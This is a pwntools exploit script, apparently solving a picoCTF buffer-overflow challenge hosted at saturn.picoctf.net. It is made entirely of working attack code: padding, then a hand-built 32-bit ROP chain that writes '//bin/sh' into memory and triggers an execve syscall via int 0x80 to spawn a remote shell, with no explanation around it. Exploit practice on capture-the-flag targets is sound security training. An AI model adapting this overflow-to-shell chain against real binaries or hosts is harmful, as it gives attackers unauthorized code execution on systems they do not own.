#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep
from struct import pack

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./vuln"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("saturn.picoctf.net", 62254)
elif len(argv) >= 2 and argv[1] == "d":
        cmd = """
                b *vuln+59
                c
        """
        p = gdb.debug(chall,cmd)
else:
    p = process(chall)

l = lambda x : pack('I', x)

IMAGE_BASE_0 = 0x08048000 # 1cfa6d55a06a41b7ad07bc10d5c0e49faf1b199d477416d6f6474daf482b1aa6
rebase_0 = lambda x : l(x + IMAGE_BASE_0)

rop = b''
rop += b'A' * 28
rop += rebase_0(0x0006874a) # 0x080b074a: pop eax; ret;
rop += b'//bi'
rop += rebase_0(0x000103c9) # 0x080583c9: pop edx; pop ebx; ret;
rop += rebase_0(0x0009d060)
rop += l(0xdeadbeef)
rop += rebase_0(0x00011102) # 0x08059102: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x0006874a) # 0x080b074a: pop eax; ret;
rop += b'n/sh'
rop += rebase_0(0x000103c9) # 0x080583c9: pop edx; pop ebx; ret;
rop += rebase_0(0x0009d064)
rop += l(0xdeadbeef)
rop += rebase_0(0x00011102) # 0x08059102: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x0006874a) # 0x080b074a: pop eax; ret;
rop += l(0x00000000)
rop += rebase_0(0x000103c9) # 0x080583c9: pop edx; pop ebx; ret;
rop += rebase_0(0x0009d068)
rop += l(0xdeadbeef)
rop += rebase_0(0x00011102) # 0x08059102: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x0000e565) # 0x08056565: pop ebx; ret;
rop += rebase_0(0x0009d060)
rop += rebase_0(0x00001e39) # 0x08049e39: pop ecx; ret;
rop += rebase_0(0x0009d068)
rop += rebase_0(0x0004a435) # 0x08092435: pop edx; xor eax, eax; pop edi; ret;
rop += rebase_0(0x0009d068)
rop += l(0xdeadbeef)
rop += rebase_0(0x0006874a) # 0x080b074a: pop eax; ret;
rop += l(0x0000000b)
rop += rebase_0(0x00029650) # 0x08071650: int 0x80; ret;

p.recvuntil("grasshopper")
p.sendline(rop)

p.interactive()
